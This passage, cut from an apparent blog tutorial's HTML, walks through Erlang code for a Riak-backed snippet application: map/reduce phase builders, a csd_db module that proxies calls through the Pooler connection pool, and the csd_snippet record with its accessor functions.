</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Map phase from raw JS source. This overload</span>
</span><span class='line'><span class="c">%%      defaults Keep to true and Arg to none.</span>
</span><span class='line'><span class="nf">add_map_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">JsSource</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_map_js</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="n">true</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Map phase from raw JS source. This overload</span>
</span><span class='line'><span class="c">%%      defaults Arg to none.</span>
</span><span class='line'><span class="nf">add_map_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_map_js</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">,</span> <span class="n">none</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Map phase from raw JS source.</span>
</span><span class='line'><span class="nf">add_map_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{</span><span class="n">phases</span><span class="o">=</span><span class="nv">P</span><span class="p">},</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">,</span> <span class="nv">Arg</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR</span><span class="nl">#mr</span><span class="p">{</span>
</span><span class='line'>    <span class="n">phases</span> <span class="o">=</span> <span class="p">[{</span><span class="n">map</span><span class="p">,</span> <span class="p">{</span><span class="n">jsanon</span><span class="p">,</span> <span class="nv">JsSource</span><span class="p">},</span> <span class="nv">Arg</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">}|</span><span class="nv">P</span><span class="p">]</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Reduce phase from raw JS source. This overload</span>
</span><span class='line'><span class="c">%%      defaults Keep to true and Arg to none.</span>
</span><span class='line'><span class="nf">add_reduce_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">JsSource</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_reduce_js</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="n">true</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Reduce phase from raw JS source. This overload</span>
</span><span class='line'><span class="c">%%      defaults Keep to true.</span>
</span><span class='line'><span class="nf">add_reduce_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_reduce_js</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">,</span> <span class="n">none</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Reduce phase from raw JS source.</span>
</span><span class='line'><span class="nf">add_reduce_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{</span><span class="n">phases</span><span class="o">=</span><span class="nv">P</span><span class="p">},</span> <span class="nv">JsSource</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">,</span> <span class="nv">Arg</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR</span><span class="nl">#mr</span><span class="p">{</span>
</span><span class='line'>    <span class="n">phases</span> <span class="o">=</span> <span class="p">[{</span><span class="n">reduce</span><span class="p">,</span> <span class="p">{</span><span class="n">jsanon</span><span class="p">,</span> <span class="nv">JsSource</span><span class="p">},</span> <span class="nv">Arg</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">}|</span><span class="nv">P</span><span class="p">]</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Reduce sort phase using Riak&#39;s built in sort function</span>
</span><span class='line'><span class="c">%%      using the specified comparison function written in raw JS. This overload</span>
</span><span class='line'><span class="c">%%      defaults Keep to true.</span>
</span><span class='line'><span class="nf">add_reduce_sort_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{},</span> <span class="nv">CompareFun</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">add_reduce_sort_js</span><span class="p">(</span><span class="nv">MR</span><span class="p">,</span> <span class="nv">CompareFun</span><span class="p">,</span> <span class="n">true</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% @doc Creates a map/reduce Reduce sort phase using Riak&#39;s built in sort function</span>
</span><span class='line'><span class="c">%%      using the specified comparison function written in raw JS.</span>
</span><span class='line'><span class="nf">add_reduce_sort_js</span><span class="p">(</span><span class="nv">MR</span><span class="o">=</span><span class="nl">#mr</span><span class="p">{</span><span class="n">phases</span><span class="o">=</span><span class="nv">P</span><span class="p">},</span> <span class="nv">CompareFun</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR</span><span class="nl">#mr</span><span class="p">{</span>
</span><span class='line'>    <span class="n">phases</span> <span class="o">=</span> <span class="p">[{</span><span class="n">reduce</span><span class="p">,</span> <span class="p">{</span><span class="n">jsfun</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;Riak.reduceSort&quot;</span><span class="o">&gt;&gt;</span><span class="p">},</span> <span class="nv">CompareFun</span><span class="p">,</span> <span class="nv">Keep</span><span class="p">}|</span><span class="nv">P</span><span class="p">]</span>
</span><span class='line'>  <span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Many of you will probably be able to digest this code without explanation. But just in case there&rsquo;s a little bit of confusion:</p>

<ul>
<li><code>#mr</code> is an internally defined record which will accumulate a set of inputs and phases to execute against riak. This is internal so that external callers are &ldquo;forced&rdquo; to use the module to construct a map/reduce job.</li>
<li>The <code>create/0</code> function simply creates an instance of a <code>#mr</code> record that the user can start to add map/reduce details to.</li>
<li>Each of the <code>add_*</code> functions is used to add an input or a phase to to a <code>#mr</code> record. For this version of the application we&rsquo;re use JavaScript for our map/reduce phases. Functions that deal with JavaScript tend to have <code>_js</code> as a suffix.</li>
<li>The <code>add_reduce_sort_js/3</code> function is one example of where we&rsquo;re using an internal Riak javascript reduce function. This function sorts elements during the reduce phase and uses a user-defined JavaScript function passed in as an argument to the phase.</li>
<li>The <code>run/2</code> function executes the map/reduce job in Riak and returns the result.</li>
</ul>


<p>This module makes use of the <code>csd_riak:index/2</code> function which helps create well-formed index names. This is used when constructing index inputs.</p>

<p>That&rsquo;s map/reduce taken care of (for now). With the guts of boilerplate Riak interaction taken care of, let&rsquo;s have a look at our approach to data storage.</p>

<h2><a id="goodby-csdcoreserver"></a>Goodbye <code>csd_core_server</code></h2>

<p>When I first started working on this application I created <code>csd_core_server</code> with the intent of using it as a bridge between the application and Riak. This module, implemented as a <a href="http://www.erlang.org/doc/man/gen_server.html" title="Erlang gen_server">gen_server</a>, would have been responsible for handling and managing a pool of connections to Riak.</p>

<p>This concern has changed given that we are now using <a href="https://github.com/OJ/pooler" title="Pooler">Pooler</a> to solve this problem for us. As a result, the idea of having a <code>gen_server</code> doesn&rsquo;t really make sense. Instead it makes more sense to have a module which handles interacting with <a href="https://github.com/OJ/pooler" title="Pooler">Pooler</a> so that other areas of the application don&rsquo;t need to know it&rsquo;s there.</p>

<p><code>csd_core_server</code> has now been removed and replaced with another module called <code>csd_db</code>. This new module is not a <code>gen_server</code>, it is simple a plain module which exposes an interface to the database.</p>

<p>Abstraction purists might argue that this is a positive as it gives us the ability to swap our database out for something else and the consumers of <code>csd_db</code> wouldn&rsquo;t even know. This might be true, but that&rsquo;s not really the goal. The goal is to put all the <a href="https://github.com/OJ/pooler" title="Pooler">Pooler</a> interaction in a single spot.</p>

<p>Rather than show the module here in its entirety, we&rsquo;ll break it up into chunks: snippets, users and votes. Each of these chunks will be looked at when we dive into storage of those individual bits of data. To give an idea of the purpose that it serves see the following diagram:</p>

<p><img src="http://buffered.io/uploads/2012/07/part5-db-modules.png" title="'Database Module Interaction'" ></p>

<p>The modules on the left invoke functions on <code>csd_db</code> which then invokes functions on the respective store modules passing in an extra parameter which is a <code>RiakPid</code> so that the store modules can talk to Riak. Simple!</p>

<p>Since <code>csd_db</code> is just a helper that we&rsquo;ll be using across all modules, let&rsquo;s take a look at it first.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_db.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_db</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">get_snippet</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">save_snippet</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">list_snippets</span><span class="o">/</span><span class="mi">1</span><span class="p">]).</span>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">get_user</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">save_user</span><span class="o">/</span><span class="mi">1</span><span class="p">]).</span>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">get_vote</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">save_vote</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">vote_count_for_snippet</span><span class="o">/</span><span class="mi">1</span><span class="p">,</span> <span class="n">vote_count_for_snippet</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Snippet API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save_snippet</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>   <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_snippet_store</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_snippet</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_snippet_store</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">SnippetKey</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">list_snippets</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_snippet_store</span><span class="p">:</span><span class="n">list_for_user</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% User API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_user</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_user_store</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save_user</span><span class="p">(</span><span class="nv">User</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_user_store</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">User</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Vote API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_vote</span><span class="p">(</span><span class="nv">VoteId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_vote_store</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">VoteId</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save_vote</span><span class="p">(</span><span class="nv">Vote</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nn">csd_vote_store</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Vote</span><span class="p">)</span> <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">vote_count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>   <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>        <span class="nn">csd_vote_store</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">vote_count_for_snippet</span><span class="p">(</span><span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">pooler</span><span class="p">:</span><span class="n">use_member</span><span class="p">(</span><span class="k">fun</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>        <span class="nn">csd_vote_store</span><span class="p">:</span><span class="n">count_for_snippet</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">SnippetId</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span>
</span><span class='line'>    <span class="k">end</span><span class="p">).</span>
</span></code></pre></td></tr></table></div></figure>


<p>The pattern we&rsquo;re applying should now be obvious. Each function just proxies the call to another module which takes all the source parameters plus a <code>pid</code> which can be used to talk to Riak.</p>

<p>With that out of the way, let&rsquo;s dive into what the individual modules do.</p>

<h2><a id="storing-snippets"></a>Storing Snippets</h2>

<p>Until now we&rsquo;ve only ever stored snippets and we haven&rsquo;t really done anything complicated with them. The earlier versions of our <code>csd_snippet</code> module, the one which encapsulated the snippet functionality, contained methods which covered two concerns: construction/creation of the snippet and storing/retrieval of snippets. Rather than continuing to mix concerns, we&rsquo;re going to break this module up into two: <code>csd_snippet</code> and <code>csd_snippet_store</code>. The aim is for the former to act like an API to the snippet functionality. This is the one that will be invoked from our web application. The latter will be invoked by the former in the cases where data needs to be written to or read from the data store.</p>

<p>Hopefully now you can see where this fits into the diagram shown above. <code>csd_snippet</code> is paired with <code>csd_snippet_store</code> and <code>csd_db</code> is used as a bridge between the two which provides the connections to Riak.</p>

<h3><a id="csd_snippet"></a><code>csd_snippet</code> module</h3>

<p><code>csd_snippet</code> has changed drastically since we last looked at it, so let&rsquo;s go through the module bit by bit as it currently stands.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Internal Record Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">record</span><span class="p">(</span><span class="nl">snippet</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">user_id</span><span class="p">,</span>
</span><span class='line'>    <span class="n">key</span><span class="p">,</span>
</span><span class='line'>    <span class="n">title</span><span class="p">,</span>
</span><span class='line'>    <span class="n">left</span><span class="p">,</span>
</span><span class='line'>    <span class="n">right</span><span class="p">,</span>
</span><span class='line'>    <span class="n">created</span>
</span><span class='line'>  <span class="p">}).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>snippet</code> record is an internal container for all the data we need when dealing with a single snippet. Some of this information is stored in Riak as part of the payload, other detail is stored as an index. More to come on this later.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_snippet</span><span class="p">(</span><span class="nv">Title</span><span class="p">,</span> <span class="nv">Left</span><span class="p">,</span> <span class="nv">Right</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nl">#snippet</span><span class="p">{</span>
</span><span class='line'>    <span class="n">user_id</span> <span class="o">=</span> <span class="nv">UserId</span><span class="p">,</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">new_key</span><span class="p">(),</span>
</span><span class='line'>    <span class="n">title</span> <span class="o">=</span> <span class="nv">Title</span><span class="p">,</span>
</span><span class='line'>    <span class="n">left</span> <span class="o">=</span> <span class="nv">Left</span><span class="p">,</span>
</span><span class='line'>    <span class="n">right</span> <span class="o">=</span> <span class="nv">Right</span><span class="p">,</span>
</span><span class='line'>    <span class="n">created</span> <span class="o">=</span> <span class="nn">csd_date</span><span class="p">:</span><span class="n">utc_now</span><span class="p">()</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>to_snippet/4</code> allows construction of snippets from basic information: <code>title</code>, <code>left</code>, <code>right</code> and <code>user_id</code>. Behind the scenes we determine the current date/time in UTC format (details of this function coming later) and store that alongside the snippet in the <code>created</code> field. We also generate a new (hopefully unique) key for the snippet at the same time.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_list</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="n">fetch</span><span class="p">(</span><span class="nb">list_to_binary</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">));</span>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span> <span class="k">when</span> <span class="nb">is_binary</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">get_snippet</span><span class="p">(</span><span class="nv">SnippetKey</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save</span><span class="p">(</span><span class="nv">Snippet</span><span class="o">=</span><span class="nl">#snippet</span><span class="p">{})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">save_snippet</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">list_for_user</span><span class="p">(</span><span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nn">csd_db</span><span class="p">:</span><span class="n">list_snippets</span><span class="p">(</span><span class="nv">UserId</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>These three functions are the &ldquo;main&rdquo; functions, so to speak. That is, the main opertions that are done with snippets are fetching, saving and listing. Each one of them simply passes the call on to <code>csd_db</code> to invoke functions on <code>csd_snippet_store</code> with a Riak connection. Details of what those functions do are coming shortly.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">set_user_id</span><span class="p">(</span><span class="nv">Snippet</span><span class="o">=</span><span class="nl">#snippet</span><span class="p">{},</span> <span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Snippet</span><span class="nl">#snippet</span><span class="p">{</span>
</span><span class='line'>    <span class="n">user_id</span> <span class="o">=</span> <span class="nv">UserId</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_user_id</span><span class="p">(</span><span class="nl">#snippet</span><span class="p">{</span><span class="n">user_id</span><span class="o">=</span><span class="nv">UserId</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">UserId</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">get_key</span><span class="p">(</span><span class="nl">#snippet</span><span class="p">{</span><span class="n">key</span><span class="o">=</span><span class="nv">Key</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Key</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="nf">set_key</span><span class="p">(</span><span class="nv">Snippet</span><span class="o">=</span><span class="nl">#snippet</span><span class="p">{},</span> <span class="nv">NewKey</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Snippet</span><span class="nl">#snippet</span><span class="p">{</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="nv">NewKey</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The functions listed above are basic get and set operations for certain pieces of information that live within the snippet. When storing snippets, we need to be able to set a secondary index value for <code>user_id</code> and given that the structure of the snippet is hidden to all outside of the <code>csd_snippet</code> module this function is required to expose the user&rsquo;s id.</p>

<p>At this point it might not be as obvious as to why we need to provide the ability to set a key on the snippet, but this will come clear later on when we look at <a href="#snippet-submission">snippet submission</a>.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
